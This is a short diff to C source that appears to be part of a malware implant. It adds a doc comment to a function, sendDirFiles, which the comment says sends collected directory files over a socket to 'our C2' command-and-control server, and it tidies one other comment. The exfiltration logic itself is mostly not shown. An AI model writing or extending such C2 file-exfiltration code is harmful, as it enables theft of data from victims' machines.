@@ -84,6 +84,14 @@ cleanup:
 	return status;
 }
 
+/** This function will send our files we've collected from our dir list to our C2
+params:
+* clientSock - current open socket to our C2
+* dirFiles - array holding each of our file names
+* numDirFiles - number of files in our array
+return:
+* if successful we return SUCCESS; otherwise print error code and handle appropiately
+*/
 INT sendDirFiles(__inout SOCKET clientSock, __in char** dirFiles, __in UINT32 numDirFiles)
 {
 	INT status = SUCCESS;
@@ -127,7 +135,7 @@ INT sendDirFiles(__inout SOCKET clientSock, __in char** dirFiles, __in UINT32 nu
 
 	free(dirFiles);
 
-	// currently our status is set to the number of bytes returned so make sure we're actually successful
+	// Currently our status is set to the number of bytes returned so make sure we're actually successful
 	status = SUCCESS;
 
 
